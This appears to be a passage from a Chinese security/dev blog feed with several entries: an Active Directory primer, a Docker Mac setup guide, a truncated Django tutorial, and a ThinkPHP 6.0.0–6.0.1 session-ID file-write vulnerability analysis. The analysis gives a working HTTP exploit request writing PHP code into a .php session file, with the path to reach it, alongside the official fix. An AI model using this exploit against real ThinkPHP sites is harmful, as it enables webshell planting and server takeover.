_计算机域_彼此之间已经建立了信任关系,在域内访问其他机器,不再需要被访问机器的许可。</p></li><li><p>和工作组比较，相当于加入了管理功能，有一些身份验证的功能，更加智能和安全</p></li></ul><hr><h4 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h4><ul><li>活动目录（Active Directory，AD）是指域环境中提供目录服务的组件</li><li>活动目录主要提供以下功能。<br> 账号集中管理：所有账号均存储在服务器上，以便对账号进行重置命令/重置密码等。<br> 软件集中管理：统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让<br>用户自由选择要安装的软件。<br> 环境集中管理：统一客户端桌面、IE、TCP/IP 协议等的设置。<br> 增强安全性：统一部署杀毒软件和扫毒任务、集中管理用户的计算机权限、统一制订用户<br>密码策略等。可以监控网络，对资料进行统一管理。<br> 更可靠，更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡<br>等技术对文件服务器进行容灾设定。更可靠，宕机时间更短。</li></ul><hr><h4 id="DC-域控制器（DC）"><a href="#DC-域控制器（DC）" class="headerlink" title="DC 域控制器（DC）"></a>DC 域控制器（DC）</h4><ul><li><p>域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录（AD）的计算机称为域控制器。在第一次安装活动目录时,安装活动目录的那台计算机就成为域控制器,简称“域控”</p></li><li><p>是一个域中的一台类似管理员一台机子，域控制器负责每一台联入的计算机和用户的验证工作，可以控制域中的计算机，鉴别是不是我们域中的机子。</p></li></ul><hr><h4 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h4><ul><li><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区</p></li><li><p>一般情况下DC和DNS是一个服务器</p></li></ul><hr><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><h4 id="DMZ是什么？"><a href="#DMZ是什么？" class="headerlink" title="DMZ是什么？"></a>DMZ是什么？</h4><p>英文全名“Demilitarized Zone”，中文含义是“隔离区”。在安全领域的具体含义是“内外网防火墙之间的区域”。</p><p>俗称非军事化区</p><p>最主要的知识点，访问控制的情况：</p><ol><li>内网可以访问外网：内网用户访问外网，内网的人也是要上网办公的。</li><li>内网可以访问 DMZ：也得管理自己的网站邮箱服务器</li><li>外网不能访问内网</li><li>外网可以访问DMZ：DMZ中的服务器需要为外界提供服务</li><li>DMZ 不能访问内网</li><li>DMZ 不能访问外网，这个也是不一定，有些服务也是需要访问的，所以这个看情况</li></ol><hr><h4 id="域中有哪些电脑？"><a href="#域中有哪些电脑？" class="headerlink" title="域中有哪些电脑？"></a>域中有哪些电脑？</h4><p>域控制器：DC一般是一个或者两个</p><p>成员服务器：域控底下没有按照AD的普通电脑</p><p>客户机：有一些办公的电脑，例如运维的电脑</p><p>独立的服务器：在一个网里面，但是没加入域环境</p><hr><h3 id="域内的权限分类"><a href="#域内的权限分类" class="headerlink" title="域内的权限分类"></a>域内的权限分类</h3><h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>单个域里面自己指派屋多个域来访问，就是把我自己本域的资源授权别人，但是只能在本地使用，只有自己是特权</p><p>全林 干 我</p><h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>Donain Admin是最大全局组</p><p>单域用户访问多域资源（必须是同一个域里面的用户），我就是域管理员。</p><p>本域 干 全林</p><h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>通用组成员来自域森林中任何域的用户</p><p>账户非常适于域森林中的跨域访问</p><p>全林 干 全林</p><hr><h3 id="A-G-DL-P-策略"><a href="#A-G-DL-P-策略" class="headerlink" title="A-G-DL-P 策略"></a>A-G-DL-P 策略</h3><p>常用的策略形式</p><ul><li>A（Account）表示用户账号。</li><li>G（Global Group）表示全局组。</li><li>U（Universal Group）表示通用组。</li><li>DL（Domain Local Group）表示域本地组。</li><li>P（Permission，许可）表示资源权限。</li><li>按照 A-G-DL-P 策略对用户进行组织和管理会更容易</li><li>A-G-DL-P 策略是指，将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本<br>地组分配资源权限。</li></ul><hr><h3 id="常用本地域组的权限"><a href="#常用本地域组的权限" class="headerlink" title="常用本地域组的权限"></a>常用本地域组的权限</h3><p><strong>管理员组（Administrators）的成员可以完全不受限制地存取计算机/域的资源，最强组吧。</strong></p><p>备份操作员组（Backup Operators）的成员可以在域控制器上执行备份和还原操作，并可以<br>在本地登录和关闭域控制器。</p><p>远程登录组（Remote Desktop Users）的成员被授予远程登录的权限</p><p><strong>域管理员组（Domain Admins）的成员在所有加入域的服务器和工作站、域控制器和活动目</strong><br><strong>录上均默认拥有完整的管理员权限。 我们俗称的域管理员。</strong></p><p><strong>企业系统管理员组（Enterprise Admins）是域森林根域中的一个组。该组在域森林中的每个</strong><br><strong>域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权</strong></p><p>打印机操作员组（Print Operators）的成员可以管理网络打印机</p><p>账号操作员组（Account Operators）的成员可以创建和管理该域中的用户和组，并可以设置<br>其权限</p><p>域用户组（Domain Users）是所有域的成员</p><hr>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker基础篇-安装和配置</title>
      <link href="/2020/03/04/docker%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/03/04/docker%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>docker基础篇-安装和配置  </p><p>mac上官方安装介绍<br>docker官网mac安装<br>也可以参考这个<br>安装教程开始<br>第一步下载<br><a href="https://hub.docker.com/editions/community/docker-ce-desktop-mac/" target="_blank" rel="noopener">https://hub.docker.com/editions/community/docker-ce-desktop-mac/</a><br>Get Docker<br>Stable<br>Edge</p><p>The Stable version is fully baked and tested, and comes with the latest GA release of Docker.<br>The Edge version offers cutting edge features and comes with experimental features turned on.</p><p>Get Docker Desktop for Mac (Stable)<br>Get Docker Desktop for Mac (Edge)</p><p>这有两种<br>Stable 季度版本<br>Edge 月版本<br>完成下载docker.dmg<br>第二部安装<br>双击正常安装  </p><p>第三部打开docker<br>双击图标，成功打开  </p><p>第四部登陆<br>登录dockerId ，开始安装数据<br>如果没有id要求注册一个 点击注册<br>成功登陆，安装完毕  </p><p>第五部检查环境<br>docker -v  </p><p>第六部安装Kitematic（可选）<br>安装Kitematic<br>kitematic是docker推出的GUI工具,使操作docker的方式变得更简单直观。<br><a href="https://github.com/docker/kitematic/releases" target="_blank" rel="noopener">https://github.com/docker/kitematic/releases</a><br><a href="https://kitematic.com" target="_blank" rel="noopener">https://kitematic.com</a><br>下载Kitematic-0.17.10-Mac.zip版本的<br>重要的一步-镜像加速<br>国内从 DockerHub 拉取镜像有时会遇到困难，此时可以配置镜像加速器。Docker 官方和国内很多云服务商都提供了国内加速器服务，例如：  </p><p>镜像加速器<br>镜像加速器地址<br>专属加速<br>其它加速</p><p>Docker 中国官方镜像<br><a href="https://registry.docker-cn.com" target="_blank" rel="noopener">https://registry.docker-cn.com</a>  </p><p>Docker Hub</p><p>DaoCloud 镜像站<br><a href="http://f1361db2.m.daocloud.io" target="_blank" rel="noopener">http://f1361db2.m.daocloud.io</a><br>可登录，系统分配<br>Docker Hub</p><p>Azure 中国镜像<br><a href="https://dockerhub.azk8s.cn" target="_blank" rel="noopener">https://dockerhub.azk8s.cn</a>  </p><p>Docker Hub、GCR、Quay</p><p>科大镜像站<br><a href="https://docker.mirrors.ustc.edu.cn" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn</a>  </p><p>Docker Hub、GCR、Quay</p><p>阿里云<br>https://.mirror.aliyuncs.com<br>需登录，系统分配<br>Docker Hub</p><p>七牛云<br><a href="https://reg-mirror.qiniu.com" target="_blank" rel="noopener">https://reg-mirror.qiniu.com</a>  </p><p>Docker Hub、GCR、Quay</p><p>网易云<br><a href="https://hub-mirror.c.163.com" target="_blank" rel="noopener">https://hub-mirror.c.163.com</a>  </p><p>Docker Hub</p><p>腾讯云<br><a href="https://mirror.ccs.tencentyun.com" target="_blank" rel="noopener">https://mirror.ccs.tencentyun.com</a>  </p><p>Docker Hub</p><p>对于使用 Mac OS X 的用户<br>在任务栏点击 Docker for mac 应用图标-&gt; Perferences…-&gt; Daemon-&gt; Registrymirrors。在列表中填写加速器地址 <a href="https://registry.docker-cn.com" target="_blank" rel="noopener">https://registry.docker-cn.com</a> 。<br>修改完成之后，点击 Apply&amp;Restart 按钮，Docker 就会重启并应用配置的镜像地址了。</p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 6.0.1 漏洞分析（任意文件操作）</title>
      <link href="/2020/02/12/ThinkPHP%206.0.1%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%89/"/>
      <url>/2020/02/12/ThinkPHP%206.0.1%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell。</p><h4 id="具体受影响版"><a href="#具体受影响版" class="headerlink" title="具体受影响版"></a>具体受影响版</h4><p>ThinkPHP6.0.0-6.0.1。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>/tp60/app/middleware.php 文件开启session</p><p>去掉se注释session的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>tp5/public/index.php 在控制器中加入测试session的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sid =$_POST[<span class="string">'key'</span>];</span><br><span class="line">        session(<span class="string">'zeo'</span>,$sid);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>意思是获取一个key设置写入session中<br>注：使用thinkphp6 最好使用高版本 的php</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。</p><p>漏洞首先出现的地方是 sessionid可控<br>tp6/vendor/topthink/framework/src/think/session/Store.php<br>121行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * session_id设置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $id session_id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span><span class="params">($id = null)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sessionid的设置的时候 为进行效验，只要是32位的就可以</p><p>同一个文件看一下session保存<br>tp6/vendor/topthink/framework/src/think/session/Store.php 254行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 保存session数据</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">       $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">           $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>先获取session id 然后是 <code>$this-&gt;handler-&gt;write($sessionId, $data);;</code><br>在跟进一下handler<br>只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, SessionHandlerInterface $handler, array $serialize = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name    = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = $handler;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($serialize)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;serialize = $serialize;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setId();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php<br>这里获取到 PHPSESSID 的值 session id传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;</span><br><span class="line">          $sessionId = $request-&gt;request($varSessionId);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          $sessionId = $request-&gt;cookie($cookieName);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ($sessionId) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;session-&gt;setId($sessionId);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$request-&gt;cookie($cookieName);这个里面看一下</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> $name = <span class="string">'PHPSESSID'</span>; 发现是这个参数</span><br><span class="line"></span><br><span class="line">所以这个值就从PHPSESSID传就好了</span><br></pre></td></tr></table></figure><p>然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方</p><p>最后保存session数据 在代码tp6/vendor/topthink/framework/src/think/session/Store.php<br>跟进这个write方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">这里的 handler 是  继承的think\session\driver\file.php</span><br></pre></td></tr></table></figure><p>跟进这个write方法<br>tp6/vendor/topthink/framework/src/think/session/driver/File.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(string $sessID, string $sessData)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getFileName($sessID, <span class="keyword">true</span>);</span><br><span class="line">        $data     = $sessData;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile($filename, $data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有文件名的处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getFileName($sessID, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileName</span><span class="params">(string $name, bool $auto = false)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;config[<span class="string">'prefix'</span>] . DIRECTORY_SEPARATOR . <span class="string">'sess_'</span> . $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $name = <span class="string">'sess_'</span> . $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] . $name;</span><br><span class="line">        $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件名只进行了路径拼接和加前缀</p><p>数据压缩没啥用 跟进 <code>$this-&gt;writeFile($filename, $data);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span><span class="params">($path, $content)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> (bool) file_put_contents($path, $content, LOCK_EX);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>直接写入了。这样就出现问题了，文件名可控，XXX.php 里面的内容是序列化之后的，但是可控制话也说直接getshell</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>根据我写的控制器<br>构造数据包</p><p>注意 session PHPSESSID= 后面要按照要求必须 32位 可以随便构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /tp6/<span class="keyword">public</span>/index.php/index/test1 HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 24</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/tp6/public/index.php/index/test1</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=1234567890123456789012345678.php; </span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">key=&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是找到这个文件</p><p>一般位于项目根目录下的./runtime/session/文件夹下，<br>加上之前前缀的拼接，那就是<br>/runtime/session/sess_1234567890123456789012345678.php</p><p>然后成功<br><img src="https://img-blog.csdnimg.cn/20200212175854419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>官方也给出方案</p><p>对session id 加一个过滤 使用 ctype_alnum（）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ctype_alnum（$id） &amp;&amp; ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django-数据库操作-未完</title>
      <link href="/2020/02/07/Django-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E6%9C%AA%E5%AE%8C/"/>
      <url>/2020/02/07/Django-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E6%9C%AA%E5%AE%8C/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Django-数据库操作</p><p>在settings.py文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql         <span class="comment"># 一定要添加这两行！通过pip install pymysql！</span></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br><span class="line"><span class="comment"># 修改DATABASES的值</span></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'mysite'</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'192.168.1.1'</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'pwd'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建数据 数据类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    uid = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 自增长ID,必须带参数为primary_key=True,并且是唯一主键</span></span><br><span class="line">    user = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 字符串类型，最大长度为10</span></span><br><span class="line">    age = models.IntegerField(default=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 数字类型，默认为1</span></span><br><span class="line">    sex = models.BooleanField()</span><br><span class="line">    <span class="comment"># BOOL类型</span></span><br><span class="line">    email = models.EmailField()</span><br><span class="line">    <span class="comment"># 自带检查 